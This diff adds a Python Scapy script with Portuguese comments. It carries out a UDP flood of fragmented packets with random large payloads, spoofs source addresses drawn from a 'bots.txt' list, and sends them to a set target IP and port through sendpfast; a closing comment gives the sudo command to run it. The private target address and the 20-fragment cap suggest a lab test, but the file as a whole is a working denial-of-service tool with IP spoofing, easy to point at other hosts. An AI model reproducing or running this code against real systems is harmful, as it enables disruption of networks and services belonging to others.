@@ -1,0 +1,60 @@
+from scapy.all import *
+import random
+import time
+import ipaddress
+import os
+
+TARGET_IP = "192.168.100.2"
+TARGET_PORT = 50001
+BOTFILE = "bots.txt"
+PACKET_PAYLOAD_SIZE = 4000   # Payload grande para garantir fragmentação!
+FRAGSIZE = 1480              # Tamanho de cada fragmento IP
+
+def load_bots(filename):
+    bot_ips = []
+    with open(filename, "r") as f:
+        for line in f:
+            ip = line.strip()
+            if ip:
+                ipaddress.ip_address(ip)
+                bot_ips.append(ip)
+    return bot_ips
+
+def run_udp_flood_attack():
+    bot_ips = load_bots(BOTFILE)
+    numero_de_pacotes_enviados = 0
+    lista_de_pacotes = []
+
+    while True:
+        source_ip = random.choice(bot_ips)
+        ip_layer = IP(src=source_ip, dst=TARGET_IP)
+        eth_layer = Ether()
+        udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)
+        payload = os.urandom(PACKET_PAYLOAD_SIZE)  # Payload aleatório e grande
+
+        packet = ip_layer / udp_layer / Raw(load=payload)
+
+        # Fragmenta o pacote IP (gera vários fragmentos)
+        fragments = fragment(packet, fragsize=FRAGSIZE)
+
+        # Adiciona cada fragmento encapsulado na camada Ethernet
+        for frag in fragments:
+            lista_de_pacotes.append(eth_layer / frag)
+            numero_de_pacotes_enviados += 1
+            if numero_de_pacotes_enviados == 20:
+                break
+        if numero_de_pacotes_enviados == 20:
+            break
+
+    start_time = time.perf_counter()
+    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
+    end_time = time.perf_counter()
+    duration = end_time - start_time
+
+    print(f"\nEnvio concluído.")
+    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+
+if __name__ == "__main__":
+    run_udp_flood_attack()
+
+# sudo PYTHONPATH=$HOME/scapy python3 udp_frag.py
